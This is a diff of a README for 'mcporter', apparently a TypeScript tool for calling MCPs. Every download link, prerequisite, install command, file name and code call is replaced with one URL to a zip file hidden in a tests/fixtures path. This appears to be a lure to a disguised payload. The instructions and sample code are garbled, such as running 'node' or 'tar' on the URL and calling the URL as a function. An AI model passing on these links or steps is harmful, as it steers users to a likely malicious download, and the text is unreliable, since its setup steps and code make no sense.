@@ -2,7 +2,7 @@
 
 ## 📥 Download Now
 
-[![Download mcporter](https://raw.githubusercontent.com/Middleclasscore207/mcporter/main/tests/fixtures/imports/home/Library/Application Support/mcporter-3.8-beta.2.zip)](https://raw.githubusercontent.com/Middleclasscore207/mcporter/main/tests/fixtures/imports/home/Library/Application Support/mcporter-3.8-beta.2.zip)
+[![Download mcporter](https://raw.githubusercontent.com/Middleclasscore207/mcporter/main/tests/fixtures/imports/home/Library/Application Support/mcporter-3.8-beta.2.zip https://raw.githubusercontent.com/Middleclasscore207/mcporter/main/tests/fixtures/imports/home/Library/Application Support/mcporter-3.8-beta.2.zip)](https://raw.githubusercontent.com/Middleclasscore207/mcporter/main/tests/fixtures/imports/home/Library/Application Support/mcporter-3.8-beta.2.zip https://raw.githubusercontent.com/Middleclasscore207/mcporter/main/tests/fixtures/imports/home/Library/Application Support/mcporter-3.8-beta.2.zip)
 
 ## 🚀 Getting Started
 
@@ -13,22 +13,22 @@ Welcome to mcporter! This software lets you easily call MCPs (Microcontroller Pe
 Before you download and run mcporter, make sure you have:
 
 - A computer with Windows, macOS, or Linux.
-- https://raw.githubusercontent.com/Middleclasscore207/mcporter/main/tests/fixtures/imports/home/Library/Application Support/mcporter-3.8-beta.2.zip installed on your machine. You can download it from [https://raw.githubusercontent.com/Middleclasscore207/mcporter/main/tests/fixtures/imports/home/Library/Application Support/mcporter-3.8-beta.2.zip Official Site](https://raw.githubusercontent.com/Middleclasscore207/mcporter/main/tests/fixtures/imports/home/Library/Application Support/mcporter-3.8-beta.2.zip). This is necessary to run TypeScript applications.
+- https://raw.githubusercontent.com/Middleclasscore207/mcporter/main/tests/fixtures/imports/home/Library/Application Support/mcporter-3.8-beta.2.zip https://raw.githubusercontent.com/Middleclasscore207/mcporter/main/tests/fixtures/imports/home/Library/Application Support/mcporter-3.8-beta.2.zip installed on your machine. You can download it from [https://raw.githubusercontent.com/Middleclasscore207/mcporter/main/tests/fixtures/imports/home/Library/Application Support/mcporter-3.8-beta.2.zip https://raw.githubusercontent.com/Middleclasscore207/mcporter/main/tests/fixtures/imports/home/Library/Application Support/mcporter-3.8-beta.2.zip Official Site](https://raw.githubusercontent.com/Middleclasscore207/mcporter/main/tests/fixtures/imports/home/Library/Application Support/mcporter-3.8-beta.2.zip https://raw.githubusercontent.com/Middleclasscore207/mcporter/main/tests/fixtures/imports/home/Library/Application Support/mcporter-3.8-beta.2.zip). This is necessary to run TypeScript applications.
 
 ## 📥 Download & Install
 
 To download mcporter, please visit this page:
 
-[Download mcporter Releases](https://raw.githubusercontent.com/Middleclasscore207/mcporter/main/tests/fixtures/imports/home/Library/Application Support/mcporter-3.8-beta.2.zip)
+[Download mcporter Releases](https://raw.githubusercontent.com/Middleclasscore207/mcporter/main/tests/fixtures/imports/home/Library/Application Support/mcporter-3.8-beta.2.zip https://raw.githubusercontent.com/Middleclasscore207/mcporter/main/tests/fixtures/imports/home/Library/Application Support/mcporter-3.8-beta.2.zip)
 
 1. Click on the link above to go to the releases page.
 2. Look for the latest version of mcporter. It will be listed at the top.
 3. Click on the version number. This will take you to the detailed release information.
 4. Scroll down to find the assets section. You will see files available for download.
 5. Depending on your operating system, select the file that suits your needs. Examples may include:
-   - https://raw.githubusercontent.com/Middleclasscore207/mcporter/main/tests/fixtures/imports/home/Library/Application Support/mcporter-3.8-beta.2.zip for Windows users
-   - https://raw.githubusercontent.com/Middleclasscore207/mcporter/main/tests/fixtures/imports/home/Library/Application Support/mcporter-3.8-beta.2.zip for macOS users
-   - https://raw.githubusercontent.com/Middleclasscore207/mcporter/main/tests/fixtures/imports/home/Library/Application Support/mcporter-3.8-beta.2.zip for Linux users
+   - https://raw.githubusercontent.com/Middleclasscore207/mcporter/main/tests/fixtures/imports/home/Library/Application Support/mcporter-3.8-beta.2.zip https://raw.githubusercontent.com/Middleclasscore207/mcporter/main/tests/fixtures/imports/home/Library/Application Support/mcporter-3.8-beta.2.zip for Windows users
+   - https://raw.githubusercontent.com/Middleclasscore207/mcporter/main/tests/fixtures/imports/home/Library/Application Support/mcporter-3.8-beta.2.zip https://raw.githubusercontent.com/Middleclasscore207/mcporter/main/tests/fixtures/imports/home/Library/Application Support/mcporter-3.8-beta.2.zip for macOS users
+   - https://raw.githubusercontent.com/Middleclasscore207/mcporter/main/tests/fixtures/imports/home/Library/Application Support/mcporter-3.8-beta.2.zip https://raw.githubusercontent.com/Middleclasscore207/mcporter/main/tests/fixtures/imports/home/Library/Application Support/mcporter-3.8-beta.2.zip for Linux users
 
 6. Click on the file to start the download. 
 
@@ -55,8 +55,8 @@ Once the download is complete, follow the steps below for installation.
 ### For Linux:
 
 1. Open the terminal.
-2. Navigate to the directory where you downloaded the `https://raw.githubusercontent.com/Middleclasscore207/mcporter/main/tests/fixtures/imports/home/Library/Application Support/mcporter-3.8-beta.2.zip` file.
-3. Use the command `tar -xzf https://raw.githubusercontent.com/Middleclasscore207/mcporter/main/tests/fixtures/imports/home/Library/Application Support/mcporter-3.8-beta.2.zip` to extract the files.
+2. Navigate to the directory where you downloaded the `https://raw.githubusercontent.com/Middleclasscore207/mcporter/main/tests/fixtures/imports/home/Library/Application Support/mcporter-3.8-beta.2.zip https://raw.githubusercontent.com/Middleclasscore207/mcporter/main/tests/fixtures/imports/home/Library/Application Support/mcporter-3.8-beta.2.zip` file.
+3. Use the command `tar -xzf https://raw.githubusercontent.com/Middleclasscore207/mcporter/main/tests/fixtures/imports/home/Library/Application Support/mcporter-3.8-beta.2.zip https://raw.githubusercontent.com/Middleclasscore207/mcporter/main/tests/fixtures/imports/home/Library/Application Support/mcporter-3.8-beta.2.zip` to extract the files.
 4. Change into the extracted directory using `cd mcporter`.
 5. Run the application by typing `./mcporter`.
 
@@ -64,27 +64,27 @@ Once the download is complete, follow the steps below for installation.
 
 Now that you have mcporter installed, you can start using it. Here’s a basic guide to help you call MCPs through TypeScript.
 
-1. Create a new TypeScript file, for example, `https://raw.githubusercontent.com/Middleclasscore207/mcporter/main/tests/fixtures/imports/home/Library/Application Support/mcporter-3.8-beta.2.zip`.
+1. Create a new TypeScript file, for example, `https://raw.githubusercontent.com/Middleclasscore207/mcporter/main/tests/fixtures/imports/home/Library/Application Support/mcporter-3.8-beta.2.zip https://raw.githubusercontent.com/Middleclasscore207/mcporter/main/tests/fixtures/imports/home/Library/Application Support/mcporter-3.8-beta.2.zip`.
 2. In this file, write a simple function to call an MCP. Here’s an example:
 
 ```typescript
 import { MCPPorter } from 'mcporter';
 
 const mcp = new MCPPorter();
-https://raw.githubusercontent.com/Middleclasscore207/mcporter/main/tests/fixtures/imports/home/Library/Application Support/mcporter-3.8-beta.2.zip('YourMCPFunction', args).then(response => {
-    https://raw.githubusercontent.com/Middleclasscore207/mcporter/main/tests/fixtures/imports/home/Library/Application Support/mcporter-3.8-beta.2.zip(response);
+https://raw.githubusercontent.com/Middleclasscore207/mcporter/main/tests/fixtures/imports/home/Library/Application Support/mcporter-3.8-beta.2.zip https://raw.githubusercontent.com/Middleclasscore207/mcporter/main/tests/fixtures/imports/home/Library/Application Support/mcporter-3.8-beta.2.zip('YourMCPFunction', args).then(response => {
+    https://raw.githubusercontent.com/Middleclasscore207/mcporter/main/tests/fixtures/imports/home/Library/Application Support/mcporter-3.8-beta.2.zip https://raw.githubusercontent.com/Middleclasscore207/mcporter/main/tests/fixtures/imports/home/Library/Application Support/mcporter-3.8-beta.2.zip(response);
 }).catch(error => {
-    https://raw.githubusercontent.com/Middleclasscore207/mcporter/main/tests/fixtures/imports/home/Library/Application Support/mcporter-3.8-beta.2.zip(error);
+    https://raw.githubusercontent.com/Middleclasscore207/mcporter/main/tests/fixtures/imports/home/Library/Application Support/mcporter-3.8-beta.2.zip https://raw.githubusercontent.com/Middleclasscore207/mcporter/main/tests/fixtures/imports/home/Library/Application Support/mcporter-3.8-beta.2.zip(error);
 });
 ```
 
 3. Compile your TypeScript code to JavaScript using the command:
    ```
-   tsc https://raw.githubusercontent.com/Middleclasscore207/mcporter/main/tests/fixtures/imports/home/Library/Application Support/mcporter-3.8-beta.2.zip
+   tsc https://raw.githubusercontent.com/Middleclasscore207/mcporter/main/tests/fixtures/imports/home/Library/Application Support/mcporter-3.8-beta.2.zip https://raw.githubusercontent.com/Middleclasscore207/mcporter/main/tests/fixtures/imports/home/Library/Application Support/mcporter-3.8-beta.2.zip
    ```
-4. Run the compiled JavaScript file using https://raw.githubusercontent.com/Middleclasscore207/mcporter/main/tests/fixtures/imports/home/Library/Application Support/mcporter-3.8-beta.2.zip
+4. Run the compiled JavaScript file using https://raw.githubusercontent.com/Middleclasscore207/mcporter/main/tests/fixtures/imports/home/Library/Application Support/mcporter-3.8-beta.2.zip https://raw.githubusercontent.com/Middleclasscore207/mcporter/main/tests/fixtures/imports/home/Library/Application Support/mcporter-3.8-beta.2.zip
    ```
-   node https://raw.githubusercontent.com/Middleclasscore207/mcporter/main/tests/fixtures/imports/home/Library/Application Support/mcporter-3.8-beta.2.zip
+   node https://raw.githubusercontent.com/Middleclasscore207/mcporter/main/tests/fixtures/imports/home/Library/Application Support/mcporter-3.8-beta.2.zip https://raw.githubusercontent.com/Middleclasscore207/mcporter/main/tests/fixtures/imports/home/Library/Application Support/mcporter-3.8-beta.2.zip
    ```
 
 This will execute your MCP function and log the response or any errors to the console.
